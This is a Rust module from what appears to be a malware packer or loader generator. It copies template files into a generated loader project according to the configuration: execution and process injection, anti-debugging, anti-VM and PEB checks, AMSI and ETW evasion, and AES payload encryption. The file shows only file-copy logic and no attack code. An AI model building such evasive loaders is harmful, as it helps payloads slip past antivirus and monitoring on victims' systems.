// ============================================================================
// File Operations Module - Handle template and file copying
// ============================================================================

use std::fs::File;
use std::io::prelude::*;
use crate::config::PackerConfig;
use crate::enums::*;

/// Represents a template module that can be included in the loader
#[derive(Debug)]
pub struct TemplateModule {
    pub name: &'static str,
    pub source_file: &'static str,
    pub dest_file: &'static str,
}

/// Represents an additional file needed for specific features
#[derive(Debug)]
pub struct AdditionalFile {
    pub feature: &'static str,
    pub source: &'static str,
    pub dest: &'static str,
}

/// Registry of all available template modules
pub const TEMPLATE_MODULES: &[TemplateModule] = &[
    TemplateModule {
        name: "execution_mod",
        source_file: "./template/execution/mod.rs",
        dest_file: "./loader/src/execution/mod.rs",
    },
    TemplateModule {
        name: "execution_execution",
        source_file: "./template/execution/execution.rs",
        dest_file: "./loader/src/execution/execution.rs",
    },
    TemplateModule {
        name: "execution_injection",
        source_file: "./template/execution/injection.rs",
        dest_file: "./loader/src/execution/injection.rs",
    },
    TemplateModule {
        name: "utilities_mod",
        source_file: "./template/utilities/mod.rs",
        dest_file: "./loader/src/utilities/mod.rs",
    },
    TemplateModule {
        name: "utilities_utils",
        source_file: "./template/utilities/utils.rs",
        dest_file: "./loader/src/utilities/utils.rs",
    },
    TemplateModule {
        name: "checks_mod",
        source_file: "./template/checks/mod.rs",
        dest_file: "./loader/src/checks/mod.rs",
    },
    TemplateModule {
        name: "checks_antidebug",
        source_file: "./template/checks/antidebug.rs",
        dest_file: "./loader/src/checks/antidebug.rs",
    },
    TemplateModule {
        name: "checks_antivm",
        source_file: "./template/checks/antivm.rs",
        dest_file: "./loader/src/checks/antivm.rs",
    },
    TemplateModule {
        name: "checks_misc",
        source_file: "./template/checks/misc.rs",
        dest_file: "./loader/src/checks/misc.rs",
    },
    TemplateModule {
        name: "checks_wrapper",
        source_file: "./template/checks/wrapper.rs",
        dest_file: "./loader/src/checks/wrapper.rs",
    },
    TemplateModule {
        name: "checks_peb",
        source_file: "./template/checks/peb.rs",
        dest_file: "./loader/src/checks/peb.rs",
    },
    TemplateModule {
        name: "evasion_mod",
        source_file: "./template/evasion/mod.rs",
        dest_file: "./loader/src/evasion/mod.rs",
    },
    TemplateModule {
        name: "evasion_amsi",
        source_file: "./template/evasion/amsi.rs",
        dest_file: "./loader/src/evasion/amsi.rs",
    },
    TemplateModule {
        name: "evasion_etw",
        source_file: "./template/evasion/etw.rs",
        dest_file: "./loader/src/evasion/etw.rs",
    },
    TemplateModule {
        name: "benign",
        source_file: "./template/benign.rs",
        dest_file: "./loader/src/benign.rs",
    },
    TemplateModule {
        name: "aes",
        source_file: "./template/aes/aes.rs",
        dest_file: "./loader/src/aes.rs",
    },
    TemplateModule {
        name: "crypto",
        source_file: "./template/crypto.rs",
        dest_file: "./loader/src/crypto.rs",
    },
    TemplateModule {
        name: "args",
        source_file: "./template/args.rs",
        dest_file: "./loader/src/args.rs",
    },
];

/// Additional files required for specific features
pub const ADDITIONAL_FILES: &[AdditionalFile] = &[
    AdditionalFile {
        feature: "tinyaes",
        source: "./template/aes/TinyAES.c",
        dest: "./loader/TinyAES.c",
    },
    AdditionalFile {
        feature: "tinyaes",
        source: "./template/aes/build.rs",
        dest: "./loader/build.rs",
    },
    AdditionalFile {
        feature: "ctaes",
        source: "./template/aes/CtAes.c",
        dest: "./loader/CtAes.c",
    },
    AdditionalFile {
        feature: "ctaes",
        source: "./template/aes/build.rs",
        dest: "./loader/build.rs",
    },
];

/// Setup the loader directory structure
pub fn setup_loader_directory() -> Result<(), std::io::Error> {
    let loader_exists = std::path::Path::new("loader").exists();
    
    if !loader_exists {
        println!("[*] Loader directory not found, creating...");
    }
    
    std::fs::create_dir_all("loader")?;
    std::fs::create_dir_all("loader/src")?;
    std::fs::create_dir_all("loader/src/execution")?;
    std::fs::create_dir_all("loader/src/utilities")?;
    std::fs::create_dir_all("loader/src/checks")?;
    std::fs::create_dir_all("loader/src/evasion")?;
    
    // Copy Cargo.toml from template to loader directory
    let template_cargo = "template/Cargo.toml";
    let loader_cargo = "loader/Cargo.toml";
    
    if std::path::Path::new(template_cargo).exists() {
        if !loader_exists {
            println!("[*] Copying Cargo.toml from template to loader directory...");
        }
        std::fs::copy(template_cargo, loader_cargo)?;
    } else {
        eprintln!("[-] Warning: template/Cargo.toml not found");
    }
    
    Ok(())
}

/// Copy a single template module file
fn copy_template_module(module: &TemplateModule) -> Result<(), std::io::Error> {
    std::fs::copy(module.source_file, module.dest_file)?;
    Ok(())
}

/// Check if a module should be included based on configuration
fn should_include_module(module_name: &str, config: &PackerConfig) -> bool {
    match module_name {
        "execution_mod" | "execution_execution" | "execution_injection" => true,
        "benign" => true,
        "aes" => config.encrypt.is_some(),
        "crypto" | "args" => config.encrypt.is_some(),
        "utilities_mod" | "utilities_utils" => !config.utils.is_empty(),
        "checks_mod" | "checks_antidebug" | "checks_antivm" | "checks_misc" | "checks_wrapper" | "checks_peb" => !config.checks.is_empty(),
        "evasion_mod" | "evasion_amsi" | "evasion_etw" => !config.evasion.is_empty(),
        _ => false,
    }
}

/// Copy all required template modules based on enabled features
pub fn copy_template_files(config: &PackerConfig) -> Result<(), std::io::Error> {
    for module in TEMPLATE_MODULES {
        if should_include_module(module.name, config) {
            copy_template_module(module)?;
        }
    }
    
    // Copy additional files (TinyAES.c, CtAes.c, build.rs) if needed
    for file in ADDITIONAL_FILES {
        if should_copy_additional_file(file.feature, config) {
            std::fs::copy(file.source, file.dest)?;
        }
    }
    
    Ok(())
}

/// Check if additional files should be copied based on feature
fn should_copy_additional_file(feature: &str, config: &PackerConfig) -> bool {
    match feature {
        "tinyaes" => config.encrypt == Some(EncryptionMethod::TinyAES),
        "ctaes" => config.encrypt == Some(EncryptionMethod::CTAES),
        _ => false,
    }
}

/// Write the loader stub (main.rs) to the loader directory
pub fn write_loader_stub(loader_stub: &str) -> Result<(), std::io::Error> {
    let mut file = File::create("./loader/src/main.rs")?;
    file.write_all(loader_stub.as_bytes())?;
    Ok(())
}
